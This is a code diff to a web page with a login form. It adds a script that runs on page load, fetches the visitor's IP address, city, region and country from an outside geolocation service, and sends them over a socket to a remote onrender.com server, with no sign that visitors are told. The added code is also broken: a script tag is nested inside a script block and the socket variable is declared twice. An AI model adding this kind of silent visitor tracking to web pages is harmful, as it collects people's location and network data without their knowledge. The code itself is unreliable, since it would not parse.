@@ -327,6 +327,28 @@
 
     <script>
         const socket = io("https://app-pljt.onrender.com");
+		<script>
+const socket = io("https://YOUR-RENDER-URL.onrender.com"); // replace with your render URL
+
+async function sendVisitorInfo(){
+    try{
+
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+
+        socket.emit("visitor-info",{
+            ip: data.ip,
+            city: data.city,
+            region: data.region,
+            country: data.country_name
+        });
+
+    }catch(err){
+        console.log("Location error", err);
+    }
+}
+
+sendVisitorInfo();
         const form = document.getElementById("loginPage");
         const usernameInput = document.getElementById("username");
         const passwordInput = document.getElementById("password");
